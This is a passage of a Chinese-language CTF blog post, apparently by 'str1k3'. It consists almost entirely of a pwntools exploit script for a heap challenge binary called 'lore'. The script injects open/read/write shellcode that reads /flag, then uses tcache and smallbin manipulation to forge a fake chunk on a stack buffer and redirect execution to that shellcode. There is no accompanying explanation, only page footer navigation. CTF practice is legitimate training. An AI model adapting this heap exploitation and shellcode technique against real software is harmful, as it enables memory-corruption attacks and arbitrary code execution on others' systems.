class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> p64,u64<br>p = process(<span class="hljs-string">&quot;./lore&quot;</span>)<br>elf = ELF(<span class="hljs-string">&quot;./lore&quot;</span>)<br><span class="hljs-comment">#libc = ELF(&quot;./libc-2.27.so&quot;)</span><br>context(os=<span class="hljs-string">&#x27;linux&#x27;</span>, arch=<span class="hljs-string">&#x27;amd64&#x27;</span>, log_level=<span class="hljs-string">&#x27;debug&#x27;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>():<br>    gdb.attach(p)<br>    pause()<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_addr</span>():<br>    <span class="hljs-keyword">return</span> u64(p.recvuntil(<span class="hljs-string">b&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">magic,size,payload</span>):<br>    p.recvuntil(<span class="hljs-string">&quot;&gt;&quot;</span>)<br>    p.sendline(<span class="hljs-string">b&#x27;1&#x27;</span>)<br>    p.recvuntil(<span class="hljs-string">b&quot;say a magic word before your build&quot;</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(magic))<br>    p.recvuntil(<span class="hljs-string">b&quot;You can customize the size of house here, but what about your life&quot;</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(size))<br>    p.recvuntil(<span class="hljs-string">b&quot;add something to your house\n&quot;</span>)<br>    p.send(payload)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">delete</span>(<span class="hljs-params">index</span>):<br>    p.recvuntil(<span class="hljs-string">&quot;&gt;&quot;</span>)<br>    p.sendline(<span class="hljs-string">b&#x27;2&#x27;</span>)<br>    p.recvuntil(<span class="hljs-string">b&#x27;every decision you made is meaningful&#x27;</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(index))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">index,size,payload</span>):<br>    p.recvuntil(<span class="hljs-string">&quot;&gt;&quot;</span>)<br>    p.sendline(<span class="hljs-string">b&#x27;3&#x27;</span>)<br>    p.recvuntil(<span class="hljs-string">b&quot;It&#x27;s never too late to make changes&quot;</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(index))<br>    p.recvuntil(<span class="hljs-string">b&quot;something interesting here&quot;</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(size))<br>    p.sendlineafter(<span class="hljs-string">b&quot;Now add something&quot;</span>,payload)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">index</span>):<br>    p.recvuntil(<span class="hljs-string">&quot;&gt;&quot;</span>)<br>    p.sendline(<span class="hljs-string">b&#x27;4&#x27;</span>)<br>    p.recvuntil(<span class="hljs-string">b&quot;Let&#x27;s see what you can do&quot;</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(index))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">exit</span>():<br>    p.recvuntil(<span class="hljs-string">&quot;&gt;&quot;</span>)<br>    p.sendline(<span class="hljs-string">b&#x27;5&#x27;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">magic</span>(<span class="hljs-params">magic</span>):<br>    p.recvuntil(<span class="hljs-string">&quot;&gt;&quot;</span>)<br>    p.sendline(<span class="hljs-string">b&#x27;6&#x27;</span>)<br>    p.recvuntil(<span class="hljs-string">b&quot;Use your force! CTFer&quot;</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(magic))<br><br>orw = <span class="hljs-string">b&quot;\x90&quot;</span> * <span class="hljs-number">0x100</span><br>orw  += asm(shellcraft.<span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;/flag&quot;</span>))<br>orw  += asm(shellcraft.read(<span class="hljs-number">3</span>, <span class="hljs-number">0xACE00500</span>, <span class="hljs-number">0x500</span>))<br>orw  += asm(shellcraft.write(<span class="hljs-number">1</span>, <span class="hljs-number">0xACE00500</span>, <span class="hljs-number">0x500</span>))<br>orw_addr = <span class="hljs-number">0xACE00500</span><br>stack_buffer_addr = <span class="hljs-number">0xbad00000</span><br><br>p.recvuntil(<span class="hljs-string">b&#x27;passwd:&#x27;</span>)<br>p.sendline(orw)<br><br>add(<span class="hljs-number">0x100</span>,<span class="hljs-string">b&#x27;aaaa&#x27;</span>)<span class="hljs-comment">#victim</span><br>add(<span class="hljs-number">0x100</span>,<span class="hljs-string">b&#x27;aaaa&#x27;</span>)<br>delete(<span class="hljs-number">0</span>)<br>delete(<span class="hljs-number">1</span>)<br>show(<span class="hljs-number">1</span>)<br>victim =u64(p.recvuntil(<span class="hljs-string">b&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>success(<span class="hljs-string">&quot;chunk0_addr:%s&quot;</span>,<span class="hljs-built_in">hex</span>(victim))<br><br><span class="hljs-comment">#stack_buffer_1-&gt;fd=stack_buffer_1[2]=victim</span><br>stack_buff = p64(<span class="hljs-number">0</span>) +p64(<span class="hljs-number">0x500</span>)<br>stack_buff += p64(stack_buffer_addr)<br>stack_buff +=p64(victim)<br><br>magic(stack_buff)<br><br>add(<span class="hljs-number">0x100</span>,<span class="hljs-string">b&#x27;aaaa&#x27;</span>)<span class="hljs-comment">#victim</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):<br>    add(<span class="hljs-number">0x100</span>,<span class="hljs-string">b&#x27;bbbb&#x27;</span>)<span class="hljs-comment">#tcache</span><br><br>add(<span class="hljs-number">1000</span>,<span class="hljs-string">b&#x27;cccc&#x27;</span>)<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):<br>    delete(i+<span class="hljs-number">1</span>)<br><br>add(<span class="hljs-number">1200</span>,<span class="hljs-string">b&#x27;dddd&#x27;</span>)<br><br>delete(<span class="hljs-number">0</span>)<br><br>edit(<span class="hljs-number">0</span>,<span class="hljs-number">0x100</span>,p64(<span class="hljs-number">0</span>)+p64(stack_buffer_addr))<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):<br>    add(<span class="hljs-number">0x100</span>,<span class="hljs-string">b&#x27;aaaa&#x27;</span>)<span class="hljs-comment">#tcache</span><br><br>add(<span class="hljs-number">0x100</span>,<span class="hljs-string">b&#x27;aaaa&#x27;</span>)<br>add(<span class="hljs-number">0x100</span>,p64(<span class="hljs-number">0</span>)+p64(orw_addr))<br></code></pre></td></tr></table></figure>


<div id="paginator"></div></div><div id="post-footer"><div id="pages"><div class="footer-link" style="width: 50%;text-align:right;border-right:1px #fe2 solid"><a href="/2023/11/10/ret2csu/">← 下一篇 ret2csu</a></div><div class="footer-link" style="width: 50%;right:1px;border-left:1px #fe2 solid"><a href="/2023/10/24/the-Belt-and-Road-review/">the_Belt_and_Road_review 上一篇 →</a></div></div></div></div><div class="bottom-btn"><div><a class="i-top" id="to-top" onClick="scrolls.scrolltop();" title="回到顶部" style="opacity: 0; display: none;">∧</a><a class="i-index" id="to-index" href="#toc-div" title="文章目录">≡</a><a class="i-color" id="color-mode" onClick="colorMode.change()" title="切换主题"></a></div></div></article><aside><div id="about"><a href="/" id="logo"><img src="/img/faction/1.png" alt="Logo"></a><h1 id="Dr"><a target="_blank" rel="noopener" href="https://str1ke4fun.github.io/">str1k3</a></h1><div id="description"><p></p></div></div><div id="aside-block"></div><footer><nobr>构建自 <a target="_blank" rel="noopener" href="http://hexo.io">Hexo</a></nobr><wbr><nobr> 使用主题 <a target="_blank" rel="noopener" href="https://github.com/Yue-plus/hexo-theme-arknights">Arknights</a></nobr><wbr><nobr>主题作者 <a target="_blank" rel="noopener" href="https://github.com/Yue-plus">Yue_plus</a></nobr></footer></aside><div id="shadow-aside"></div></main><canvas id="canvas-dust"></canvas><script src="/js/search.js"></script><script src="/js/arknights.js"></script><script src="//unpkg.com/lightgallery@2.7.1/lightgallery.min.js"></script><script src="//unpkg.com/lightgallery@2.7.1/plugins/zoom/lg-zoom.min.js"></script><script src="//unpkg.com/lightgallery@2.7.1/plugins/thumbnail/lg-thumbnail.min.js"></script><script src="/js/pjax.js"></script><script class="pjax-js">reset= () => {document.querySelector('.lg-container')?.remove()
lightGallery(document.getElementById('post-bg'), {
  plugins: [lgZoom,lgThumbnail],
  selector: '.item-img'})}</script><script>window.addEventListener("load",() => {pjax = new Pjax({
 cacheBust: false,
 selectors: ['title','article','#aside-block','.pjax-js'],
 switches: {'article': Pjax.switches.sideBySide},
 switchesOptions: {
   'article': {
     classNames: {
       remove: "pjax-out",
       add: "pjax-in"
     }
   }
 }
});
document.addEventListener("pjax:complete", reset);reset()})</script></body></html>